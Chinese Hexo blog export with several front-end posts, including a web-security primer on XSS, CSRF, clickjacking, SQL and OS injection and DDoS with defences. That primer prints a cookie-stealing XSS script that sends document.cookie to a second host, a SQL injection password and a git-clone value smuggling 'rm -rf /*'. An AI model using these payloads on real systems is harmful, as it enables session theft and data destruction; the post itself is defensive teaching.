<h6 id="第1步：打开Performance面板"><a href="#第1步：打开Performance面板" class="headerlink" title="第1步：打开Performance面板"></a>第1步：打开Performance面板</h6><p>按下<code>F12</code>，打开控制台，然后选择Performance面板</p>
<p><img data-src="/images/202009252008/2-5.png"></p>
<p>第2步：点击录制按钮，开始录制监测页面情况</p>
<p><img data-src="/images/202009252008/2-6.png"></p>
<p><img data-src="/images/202009252008/2-7.png"></p>
<p>第3步：在页面中进行一些操作之后，比如按下按钮、布局切换隐藏等、增加DOM节点、使用动画等，然后点击如图所示的<code>stop</code>按钮，停止监测,会得到如图所示的分析内容</p>
<p><img data-src="/images/202009252008/2-8.png"></p>
<h5 id="Performance面板分析"><a href="#Performance面板分析" class="headerlink" title="Performance面板分析"></a>Performance面板分析</h5><p>从上到下，可以将面板分为<strong>控制面板</strong>、<strong>概览面板</strong>、<strong>主面板</strong>、<strong>统计面板</strong></p>
<p><img data-src="/images/202009252008/2-9.png"></p>
<h6 id="控制面板"><a href="#控制面板" class="headerlink" title="控制面板"></a>控制面板</h6><p>使用控制面板可以模拟不同的网络和不同的CPU能力来进行测试</p>
<p><img data-src="/images/202009252008/2-10.png"></p>
<p><img data-src="/images/202009252008/2-11.png"></p>
<h6 id="概览面板"><a href="#概览面板" class="headerlink" title="概览面板"></a>概览面板</h6><p>该面板从上到下分别为：</p>
<ul>
<li>FPS图表    当你在该图表看到红色元素越多时候，说明FPS低，如果绿色元素居多，则FPS高，用户体验较好</li>
<li>CPU图表   该图表和统计面板的summary选项卡展示是对应的</li>
<li>NET图表   该图表显示页面的一些快照，对于一些动画分析还是挺好用的</li>
<li>HEAP图表 监测页面运行时JS堆的相关情况</li>
</ul>
<p><img data-src="/images/202009252008/2-12.png"></p>
<h6 id="主面板"><a href="#主面板" class="headerlink" title="主面板"></a>主面板</h6><p>在主面板上拖拽鼠标来放大某个帧事件的展示，包括FPS、CPU、JS Heap等信息</p>
<p>这块内容，如果要做性能分析，需要比较关注的点是右上角有红色标识的事件，可以重点分析该事件，找到影响性能的关键点，以此一步步进行优化。</p>
<p><img data-src="/images/202009252008/2-13.png"></p>
<h6 id="统计面板"><a href="#统计面板" class="headerlink" title="统计面板"></a>统计面板</h6><p><img data-src="/images/202009252008/2-13-1.png"></p>
<ul>
<li>Summary ：展示各个事件阶段耗费的时间</li>
<li>Bottom-Up 排序：可以看到各个事件消耗时间排序 ，<code>self-time</code> 指除去子事件这个事件本身消耗的时间 ，<code>total-time</code> 这个事件从开始到结束消耗的时间（包含子事件）</li>
<li>Call Tree 调用栈：<code>Main</code>选择一个事件，可以看到整个事件的调用栈（从最顶层到最底层，而不是只有当前事件）</li>
<li>Event Log 事件日志 ：<code>start time</code>，指事件在多少毫秒开始触发的，右边有事件描述信息</li>
</ul>
<h5 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h5><p>Chrome开发者工具中文文档：<a href="https://developers.google.cn/web/tools/chrome-devtools?hl=zh-cn">https://developers.google.cn/web/tools/chrome-devtools?hl=zh-cn</a></p>
]]></content>
      <categories>
        <category>性能优化</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>开发工具</tag>
      </tags>
  </entry>
  <entry>
    <title>web安全问题及防御</title>
    <url>/20200913/111312.html</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>随着互联网的发展，涉及网络安全的问题不可忽视，而作为一名前端工程师，了解网络安全相关的知识也是有必要的，在这里对一些常见的web安全问题及防御手段做个简单的笔记整理。</p>
</blockquote>
<a id="more"></a>

<h5 id="1、XSS攻击-跨站点脚本攻击–cross-site-scripting"><a href="#1、XSS攻击-跨站点脚本攻击–cross-site-scripting" class="headerlink" title="1、XSS攻击(跨站点脚本攻击–cross site scripting)"></a>1、XSS攻击(跨站点脚本攻击–cross site scripting)</h5><p>通过存在安全漏洞的web网站注册用户的浏览器内运行非法的HTML标签或Javascript进行的一种攻击。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">通常会找那些输入框或者地址参数栏进行测试，看是否能执行脚本，是否存在漏洞</span><br><span class="line">例如</span><br><span class="line">	http:<span class="comment">//localhost:3000?from=china;</span></span><br><span class="line">修改成</span><br><span class="line">	http:<span class="comment">//localhost:3000?from=&lt;script&gt;alert(1)&lt;/script&gt;</span></span><br><span class="line"> </span><br><span class="line">如果有弹出框，证明存在漏洞，可以插入脚本进行攻击</span><br><span class="line"></span><br><span class="line">例如</span><br><span class="line">	http:<span class="comment">//localhost:3000?from=&lt;script src=&quot;http://localhost:4000/getImg.js&quot;&gt;&lt;/script&gt;</span></span><br><span class="line">	</span><br><span class="line">getImg.js如下:</span><br><span class="line">	<span class="keyword">let</span> img=<span class="keyword">new</span> Image();</span><br><span class="line">	img.src<span class="string">&quot;http://localhost:4000?cookie=document.cookie&quot;</span>;</span><br><span class="line"></span><br><span class="line">这样 http:<span class="comment">//localhost:4000就能通过图片的请求处理拿到客户端的cookie</span></span><br><span class="line">	<span class="keyword">let</span> cookie=req.cookie;</span><br><span class="line">	<span class="built_in">console</span>.log(cookie);</span><br><span class="line">	</span><br><span class="line">XSS的危害:</span><br><span class="line">	<span class="number">1</span>、获取页面数据</span><br><span class="line">	<span class="number">2</span>、获取cookies</span><br><span class="line">	<span class="number">3</span>、发送请求</span><br><span class="line">	<span class="number">4</span>、劫持前端逻辑</span><br><span class="line">	<span class="number">5</span>、偷取网站的任意数据</span><br><span class="line">	<span class="number">6</span>、偷取用户的资料</span><br><span class="line">	<span class="number">7</span>、偷取用户的秘密和登录态</span><br><span class="line">	<span class="number">8</span>、欺骗用户</span><br><span class="line">	</span><br><span class="line">防御手段:</span><br><span class="line"><span class="number">1</span>、响应头部字段X-Xss-Protection</span><br><span class="line">	<span class="number">0</span>：禁止XSS过滤</span><br><span class="line">	<span class="number">1</span>:启用XSS过滤，浏览器默认启用，如果检测到攻击，浏览器将清除页面(删除不安全的部分)</span><br><span class="line">	<span class="number">1</span>;mode=block启用XSS过滤，如果检测到攻击，浏览器将不会清除页面，而是阻塞页面加载</span><br><span class="line">	<span class="number">1</span>;report=(Chromium  only)</span><br><span class="line">	启用XSS过滤。如果检测到跨站脚本攻击，浏览器将清除⻚⾯并使⽤CSP report-uri 指令的功能发送违规报告。</span><br><span class="line"><span class="number">2</span>、ejs转义 </span><br><span class="line">	&lt;% code %&gt;用于执行其中javascript代码</span><br><span class="line">	&lt;%= code %&gt;会对code进行html转义</span><br><span class="line">	&lt;%- code %&gt;将不会进行转义</span><br><span class="line">	</span><br><span class="line"><span class="number">3</span>、CSP(Content Security Policy) 内容安全策略</span><br><span class="line">	script-src:<span class="string">&#x27;self-src&#x27;</span></span><br><span class="line">	</span><br><span class="line"><span class="number">4</span>、转义字符</span><br><span class="line"></span><br><span class="line"><span class="number">5</span>、黑名单和白名单</span><br><span class="line">用户的输入永远不可信任的，最普遍的做法就是转义输⼊输出的内容，对于引号、尖括号、斜</span><br><span class="line">杠进行转义富文本来说，显然不能通过上⾯的办法来转义所有字符，因为这样会把需要的格式也过滤掉。</span><br><span class="line">对于这种情况，通常采用白名单过滤的办法，当然也可以通过黑名单过滤，但是考虑到需要过</span><br><span class="line">滤的标签和标签属性实在太多，更加推荐使用白名单的方式</span><br><span class="line"></span><br><span class="line"><span class="number">6</span>、响应头部字段<span class="built_in">Set</span>-Cookie 设置为HttpOnly  客户端就不能通过<span class="built_in">document</span>.cookie访问到cookie了</span><br><span class="line">	例如:</span><br><span class="line">		res.setHeader(<span class="string">&#x27;Set-Cookit&#x27;</span>,<span class="string">&#x27;uid=123; HttpOnly&#x27;</span>)</span><br></pre></td></tr></table></figure>



<h5 id="2、CSRF攻击-跨站伪造请求–cross-site-request-forgery"><a href="#2、CSRF攻击-跨站伪造请求–cross-site-request-forgery" class="headerlink" title="2、CSRF攻击(跨站伪造请求–cross site request forgery)"></a>2、CSRF攻击(跨站伪造请求–cross site request forgery)</h5><p>利用用户已登录的身份，在用户毫不知情的情况下，以用户的名义完成非法操作。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>、用户已经登录了站点 A，并在本地记录了 cookie</span><br><span class="line"><span class="number">2</span>、在用户没有登出站点 A 的情况下（也就是 cookie 有效的情况下），访问了恶意攻击者提供的引</span><br><span class="line">诱危险站点 B (B 站点要求访问站点A)。</span><br><span class="line"><span class="number">3</span>、站点 A 没有做任何 CSRF 防御</span><br><span class="line"></span><br><span class="line">CSRF的危害：</span><br><span class="line">	<span class="number">1</span>、利用用户登录态</span><br><span class="line">	<span class="number">2</span>、用户不知情</span><br><span class="line">	<span class="number">3</span>、完成业务请求</span><br><span class="line">	<span class="number">4</span>、盗取用户资金（转账，消费）</span><br><span class="line">	<span class="number">5</span>、冒充用户发帖背锅</span><br><span class="line">	<span class="number">6</span>、损害用站声誉</span><br><span class="line"></span><br><span class="line">防御手段:</span><br><span class="line">	<span class="number">1</span>、referer check  校验来源  但是https不显示referer 而且可伪造</span><br><span class="line">	<span class="number">2</span>、验证码(最有效)</span><br></pre></td></tr></table></figure>



<h5 id="3、点击劫持-clickjacking"><a href="#3、点击劫持-clickjacking" class="headerlink" title="3、点击劫持(clickjacking)"></a>3、点击劫持(clickjacking)</h5><p>点击劫持是一种视觉欺骗的攻击手段。攻击者将需要攻击的网站通过 iframe 嵌套的方式式嵌入自己<br>的网页中，并将 iframe 设置为透明，在页面中透出一个按钮诱导用户点击</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">通过视觉欺骗手段将引诱点击的按钮和iframe的网站提交按钮重叠</span><br><span class="line"></span><br><span class="line">防御手段：</span><br><span class="line"><span class="number">1</span>、响应头字段X-IFRAME-OPTIONS</span><br><span class="line">	DENY,表示页面不允许通过iframe的方式展示</span><br><span class="line">	SAMEORIGIN，表示页面可以在相同域名下通过iframe的方式展示</span><br><span class="line">	ARROW-FROM，表示页面可以在指定来源的iframe中显示</span><br><span class="line">	</span><br><span class="line">	res.setHeader(<span class="string">&#x27;X-FRAME-OPTIONS&#x27;</span>,<span class="string">&#x27;DENY)</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">	防御用 iframe 嵌套的点击劫持攻击</span></span><br><span class="line"><span class="string">	</span></span><br><span class="line"><span class="string">2、JS方式(古老的手段)</span></span><br><span class="line"><span class="string">	判断self是否和top相等</span></span><br><span class="line"><span class="string">	如果相等，则没事，</span></span><br><span class="line"><span class="string">	如果不相等，则为通过iframe来访问的，</span></span><br><span class="line"><span class="string">	让top.location=self.location</span></span><br></pre></td></tr></table></figure>



<h5 id="4、SQL注入"><a href="#4、SQL注入" class="headerlink" title="4、SQL注入"></a>4、SQL注入</h5><p>SQL注入攻击指的是通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入的数据，致使非法数据侵入系统。</p>
<p>例如特殊”密码”：1’or’1’=’1’</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 拼接后的SQL</span></span><br><span class="line">SELECT *</span><br><span class="line">FROM test.user</span><br><span class="line">WHERE username = <span class="string">&#x27;laowang&#x27;</span></span><br><span class="line">AND password = <span class="string">&#x27;1&#x27;</span>or<span class="string">&#x27;1&#x27;</span>=<span class="string">&#x27;1&#x27;</span></span><br><span class="line"></span><br><span class="line">用or达到一个怎么都正确的结果</span><br><span class="line"></span><br><span class="line">防御手段:</span><br><span class="line"><span class="number">1</span>、所有的查询语句建议使用数据库提供的参数化查询接口**，参数化的语句使用参数而不是将用户</span><br><span class="line">输入变量嵌入到 SQL 语句中，即不要直接拼接 SQL 语句。例如 Node.js 中的 mysqljs 库的</span><br><span class="line">query 方法中的 ? 占位参数。</span><br><span class="line"><span class="number">2</span>、严格限制Web应用的数据库的操作权限**，给此用户提供仅仅能够满足其工作的最低权限，从而</span><br><span class="line">最大限度的减少注入攻击对数据库的危害</span><br><span class="line"><span class="number">3</span>、后端代码检查输入的数据是否符合预期**，严格限制变量的类型，例如使用正则表达式进行一些</span><br><span class="line">匹配处理。</span><br><span class="line"><span class="number">4</span>、对进入数据库的特殊字符（<span class="string">&#x27;， &quot;， \， &lt;， &gt;， &amp;， *， ; 等）进行转义处理，或编码转换**。基本上</span></span><br><span class="line"><span class="string">所有的后端语言都有对字符串进行转义处理的方法，例如 lodash 的 lodash._escapehtmlchar</span></span><br><span class="line"><span class="string">库</span></span><br></pre></td></tr></table></figure>



<h5 id="5、OS注入"><a href="#5、OS注入" class="headerlink" title="5、OS注入"></a>5、OS注入</h5><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">和SQL差不多，不过是针对操作系统的</span><br><span class="line"><span class="comment">// 以 Node.js 为例，假如在接口中需要从 github 下载用户指定的 repo</span></span><br><span class="line"><span class="keyword">const</span> exec = <span class="built_in">require</span>(<span class="string">&#x27;mz/child_process&#x27;</span>).exec;</span><br><span class="line"><span class="keyword">let</span> params = &#123;<span class="comment">/* 用户输入的参数 */</span>&#125;;</span><br><span class="line">exec(<span class="string">`git clone <span class="subst">$&#123;params.repo&#125;</span> /some/path`</span>);</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//github.com/xx/xx.git &amp;&amp; rm -rf /* &amp;&amp;</span></span><br></pre></td></tr></table></figure>



<h5 id="6、请求劫持"><a href="#6、请求劫持" class="headerlink" title="6、请求劫持"></a>6、请求劫持</h5><ul>
<li><p>DNS劫持</p>
<blockquote>
<p>顾名思义， DNS服务器(DNS解析各个步骤)被篡改，修改了域名解析的结果，使得访问到的不是预期的ip</p>
</blockquote>
</li>
<li><p>HTTP劫持 </p>
<blockquote>
<p>运营商劫持，此时大概只能升级HTTPS了</p>
</blockquote>
<p>  防御手段：    </p>
<pre><code>  使用https安全协议</code></pre>
</li>
</ul>
<h5 id="7、DDOS攻击-分布式拒绝服务攻击–distributed-denial-of-service"><a href="#7、DDOS攻击-分布式拒绝服务攻击–distributed-denial-of-service" class="headerlink" title="7、DDOS攻击(分布式拒绝服务攻击–distributed denial of service)"></a>7、DDOS攻击(分布式拒绝服务攻击–distributed denial of service)</h5><p>DDOS 不是一种攻击，而是一大类攻击的总称。它有几十种类型，新的攻击方法还在不断发明出来。网站站运行的各个环节，都可以是攻击目标。只要把一个环节攻破，使得整个流程跑不起来，就达到了瘫痪服务的目的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">其中，比较常见的一种攻击是 cc 攻击。它就是简单粗暴地送来⼤量正常的请求，超出服务器的最⼤承</span><br><span class="line">受量，导致宕机。</span><br><span class="line"></span><br><span class="line">防御手段：</span><br><span class="line">	<span class="number">1</span>、备份网站</span><br><span class="line">	备份网站不一定是全功能的，如果能做到全静态浏览，就能满足需求。最低限度应该可以显示公</span><br><span class="line">	告，告诉用户，网站出了问题，正在全力抢修。</span><br><span class="line">	<span class="number">2</span>、HTTP 请求的拦截</span><br><span class="line">	<span class="number">3</span>、硬件 服务器 防火墙</span><br><span class="line">	- 带宽扩容 + CDN</span><br><span class="line">	提高犯罪成本</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>安全</tag>
      </tags>
  </entry>
  <entry>
    <title>使用Hexo和Gitee Pages搭建个人博客</title>
    <url>/20200905/050927.html</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><blockquote>
<p>最近想捣鼓一下个人博客，以用来承载自己的一些想法，记录自己的成长，于是想到了用Hexo+GiteePages来搭建自己的个人博客。Hexo是一款快速、简洁且高效的博客框架，而选择Gitee Pages是因为Gitee是国内代码托管平台，访问速度比Github要快。</p>
</blockquote>
<a id="more"></a>

<p><a href="https://hexo.io/">Hexo官网</a></p>
<p><a href="https://gitee.com/help/articles/4136">GiteePages文档</a></p>
<h4 id="1、Hexo安装"><a href="#1、Hexo安装" class="headerlink" title="1、Hexo安装"></a>1、Hexo安装</h4><p>安装Hexo需要用到node.js，这里默认已经安装好了node环境。</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>

<h4 id="2、初始化你的博客文件夹"><a href="#2、初始化你的博客文件夹" class="headerlink" title="2、初始化你的博客文件夹"></a>2、初始化你的博客文件夹</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">hexo init your_blog   <span class="comment">//your_blog为你的文件夹名称</span></span><br></pre></td></tr></table></figure>

<h4 id="3、进入该目录并启动服务"><a href="#3、进入该目录并启动服务" class="headerlink" title="3、进入该目录并启动服务"></a>3、进入该目录并启动服务</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">cd your_blog</span><br><span class="line">hexo s		<span class="comment">//s为server的缩写	hexo s 等价于 hexo server</span></span><br></pre></td></tr></table></figure>

<p>如果你的控制台有以下输出,证明博客已经启动。可以打开<code>localhost:4000</code>来访问站点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">INFO  Start processing</span><br><span class="line">INFO  Hexo is running at http:<span class="comment">//localhost:4000 . Press Ctrl+C to stop.</span></span><br></pre></td></tr></table></figure>

<h4 id="4、在Gitee上面新增仓库"><a href="#4、在Gitee上面新增仓库" class="headerlink" title="4、在Gitee上面新增仓库"></a>4、在Gitee上面新增仓库</h4><p>仓库名称和用户名相同，以使用GiteePages服务</p>
<h4 id="5、清除缓存"><a href="#5、清除缓存" class="headerlink" title="5、清除缓存"></a>5、清除缓存</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br></pre></td></tr></table></figure>

<h4 id="6、生成静态资源并部署"><a href="#6、生成静态资源并部署" class="headerlink" title="6、生成静态资源并部署"></a>6、生成静态资源并部署</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>

<h4 id="7、部署配置"><a href="#7、部署配置" class="headerlink" title="7、部署配置"></a>7、部署配置</h4><p>在项目目录下有一个<code>_config.yml</code>文件，站点的相关配置都在这里进行</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@gitee.com:you_account/you_account.git <span class="comment">//配置你的仓库，我这里使用的是Gitee上面的仓库</span></span><br></pre></td></tr></table></figure>

<h4 id="8、启用Gitee-Pages服务"><a href="#8、启用Gitee-Pages服务" class="headerlink" title="8、启用Gitee Pages服务"></a>8、启用Gitee Pages服务</h4><p>点击仓库服务按钮，启动Gitee Pages服务<br>此时再访问 <a href="https://your-account.gitee.io/">https://your-account.gitee.io</a> 这个网址就能访问你的博客了。</p>
]]></content>
      <categories>
        <category>博客</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>使用URLSearchParams解决axios中post请求参数问题</title>
    <url>/20201015/052307.html</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>在使用axios发送post请求时，后端小伙伴拿不到传递的参数，于是想到使用<code>URLSearchParams</code>来解决这个问题。</p>
</blockquote>
<a id="more"></a>

<p>首先，由于axios请求默认<code>Content-Type</code>为<code>application/json</code>，需要修改为<code>application/x-www-form-urlencoded</code>，如下代码所示</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">const</span> testApi = <span class="function">(<span class="params">data: any</span>) =&gt;</span></span><br><span class="line">  request(&#123;</span><br><span class="line">    url: path.testApi,</span><br><span class="line">    method: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">    headers: &#123;</span><br><span class="line">      <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    data</span><br><span class="line">  &#125;)</span><br></pre></td></tr></table></figure>

<p>然后在传递参数的时候，使用<code>URLSearchParams</code>处理参数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> params = <span class="keyword">new</span> URLSearchParams()</span><br><span class="line">params.append(<span class="string">&#x27;paramA&#x27;</span>, id)</span><br><span class="line">params.append(<span class="string">&#x27;paramb&#x27;</span>, arr)</span><br><span class="line"></span><br><span class="line">testApi(params)</span><br><span class="line">    .then(<span class="function"><span class="params">res</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.$message(&#123;</span><br><span class="line">            type: <span class="string">&#x27;success&#x27;</span>,</span><br><span class="line">            message: <span class="string">&#x27;test成功!&#x27;</span></span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure>

<p>这样处理过后，后端小伙伴就能愉快地拿到post请求传递的参数了。</p>
<p>顺便说一下，这个<code>URLSearchParams</code>兼容性不是很理想，如果你还是想使用该方法的话，可以使用<code>url-search-params-polyfill</code>这个polyfill库来解决兼容问题，具体使用可以查看相关文档：<a href="https://github.com/jerrybendy/url-search-params-polyfill/">地址传送门</a></p>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>axios</tag>
      </tags>
  </entry>
  <entry>
    <title>使用axios.cancelToken在页面跳转时取消请求</title>
    <url>/20210930/030025.html</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>在单页应用中，如果在路由跳转完的时候，存在这么一种情况，上一个页面的请求还没完成，然后在当前页面出现上一个页面的弹框信息，这样会显得奇怪，所以，可以在路由导航钩子里面取消上一个页面的请求，做法如下：</p>
</blockquote>
<a id="more"></a>

<p><code>request.js</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">request.js</span><br><span class="line"><span class="keyword">import</span> axios <span class="keyword">from</span> <span class="string">&#x27;axios&#x27;</span></span><br><span class="line"><span class="keyword">import</span> store <span class="keyword">from</span> <span class="string">&#x27;@/store&#x27;</span></span><br><span class="line"></span><br><span class="line">axios.interceptors.request.use( <span class="function"><span class="params">config</span> =&gt;</span> &#123;</span><br><span class="line">  config.cancelToken = <span class="keyword">new</span> axios.cancelToken(<span class="function"><span class="params">cancel</span> =&gt;</span> &#123;</span><br><span class="line">  	store.commit(<span class="string">&#x27;PUSH_CANCELTOKEN&#x27;</span>, &#123;</span><br><span class="line">    	cancel</span><br><span class="line">    &#125;)</span><br><span class="line">  &#125;)</span><br><span class="line">	<span class="keyword">return</span> config;	</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment">// mutations</span></span><br><span class="line"><span class="keyword">const</span> mutations = &#123;</span><br><span class="line">	PUSH_CANCELTOKEN(state, token) &#123;</span><br><span class="line">  	state.cancelTokens.push(token)</span><br><span class="line">  &#125;,</span><br><span class="line">  TRIGGER_CANCELTOKEN(state, token) &#123;</span><br><span class="line">  	state.cancelTokens.forEach(<span class="function"><span class="params">item</span> =&gt;</span> &#123;</span><br><span class="line">    	item.cancel()</span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// clear</span></span><br><span class="line">    state.cancelTokens = []</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>store/cancelToken.js</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// state</span></span><br><span class="line"><span class="keyword">const</span> state = &#123;</span><br><span class="line">  cancelTokens: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>router.js</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ...</span></span><br><span class="line">router.beforeEach(<span class="function">(<span class="params">to, <span class="keyword">from</span>, next</span>) =&gt;</span> &#123;</span><br><span class="line">	store.commit(<span class="string">&#x27;TRIGGER_CANCELTOKEN&#x27;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>axios</category>
      </categories>
      <tags>
        <tag>axios</tag>
      </tags>
  </entry>
  <entry>
    <title>壁纸分享</title>
    <url>/20200924/060026.html</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>分享几张自己喜欢的高清壁纸，安利一个超高清壁纸站点：<a href="https://wallhaven.cc/">https://wallhaven.cc/</a>  ，拥有非常多的原画/二次元类型的壁纸提供挑选，可以选择自己喜欢风格的壁纸进行下载(<em>^_^</em>)。</p>
</blockquote>
<a id="more"></a>

<p><img data-src="/images/202009241806/bizhi1.jpg"></p>
<p><img data-src="/images/202009241806/bizhi2.jpg"></p>
<p><img data-src="/images/202009241806/bizhi3.jpg"></p>
<p><img data-src="/images/202009241806/bizhi4.jpg"></p>
<p><img data-src="/images/202009241806/bizhi5.jpg"></p>
<p><img data-src="/images/202009241806/bizhi6.jpg"></p>
]]></content>
      <categories>
        <category>壁纸</category>
      </categories>
      <tags>
        <tag>壁纸</tag>
      </tags>
  </entry>
  <entry>
    <title>尝试使用rollup进行库的构建</title>
    <url>/20201029/015111.html</url>
    <content><![CDATA[<h5 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h5><blockquote>
<p>在日常项目开发中，使用的最多的就是<code>webpack</code>来进行项目的打包构建，但是如果目的是想开发一个库的话，使用<code>webpack</code>来构建打包会显得很重，这时候，<code>rollup</code>不失为一个更好的选择。相对于<code>webpack</code>可以处理各种各样的文件，<code>rollup</code>显得更为专注，它是一个<code>Javascript</code>模块打包器，可以将小块代码编译成大块复杂的代码，很多库和框架就是基于<code>rollup</code>来进行构建的，比如<code>Vue.js</code>框架。</p>
</blockquote>
<a id="more"></a>

<h5 id="1、安装rollup"><a href="#1、安装rollup" class="headerlink" title="1、安装rollup"></a>1、安装rollup</h5><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">npm i -g rollup</span><br><span class="line">// 或者</span><br><span class="line">yarn global add rollup</span><br></pre></td></tr></table></figure>

<p>使用<code>rollup -v</code>指令查看<code>rollup</code>是否安装成功</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">rollup -v</span><br><span class="line"><span class="comment">// rollup v2.32.1</span></span><br></pre></td></tr></table></figure>

<h5 id="2、使用rollup来构建简单库"><a href="#2、使用rollup来构建简单库" class="headerlink" title="2、使用rollup来构建简单库"></a>2、使用rollup来构建简单库</h5><h6 id="初始化项目"><a href="#初始化项目" class="headerlink" title="初始化项目"></a>初始化项目</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> roll-demo</span><br><span class="line"><span class="built_in">cd</span> roll-demo</span><br></pre></td></tr></table></figure>

<h6 id="创建项目配置文件"><a href="#创建项目配置文件" class="headerlink" title="创建项目配置文件"></a>创建项目配置文件</h6><p>创建项目配置文件<code>package.json</code></p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line">npm init -y</span><br></pre></td></tr></table></figure>

<h6 id="创建源码目录和入口文件"><a href="#创建源码目录和入口文件" class="headerlink" title="创建源码目录和入口文件"></a>创建源码目录和入口文件</h6><figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> src</span><br><span class="line"><span class="built_in">cd</span> src</span><br><span class="line">touch index.js // 入口文件</span><br></pre></td></tr></table></figure>

<h6 id="创建配置文件"><a href="#创建配置文件" class="headerlink" title="创建配置文件"></a>创建配置文件</h6><p>在目录下创建一个<code>rollup</code>配置文件</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">touch rollup.config.js</span><br></pre></td></tr></table></figure>

<p>文件内容如下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">export</span> <span class="keyword">default</span> &#123;</span><br><span class="line">  input: <span class="string">&#x27;src/main.js&#x27;</span>,		<span class="comment">//项目入口文件</span></span><br><span class="line">  output: &#123;</span><br><span class="line">    file: <span class="string">&#x27;.dist/bundle.umd.js&#x27;</span>,		<span class="comment">//打包出口文件</span></span><br><span class="line">    format: <span class="string">&#x27;umd&#x27;</span>			<span class="comment">//打包后的文件格式  cjs -&gt; CommonJS, iife, umd  </span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h6 id="修改项目配置文件"><a href="#修改项目配置文件" class="headerlink" title="修改项目配置文件"></a>修改项目配置文件</h6><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;rollup-demo&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;version&quot;</span>: <span class="string">&quot;1.0.0&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;description&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;main&quot;</span>: <span class="string">&quot;index.js&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;scripts&quot;</span>: &#123;</span><br><span class="line">    <span class="attr">&quot;build&quot;</span>:<span class="string">&quot;rollup --config rollup.config.js&quot;</span>	<span class="comment">//添加构建脚本，指明配置文件为rollup.config.js</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">&quot;keywords&quot;</span>: [],</span><br><span class="line">  <span class="attr">&quot;author&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;license&quot;</span>: <span class="string">&quot;ISC&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

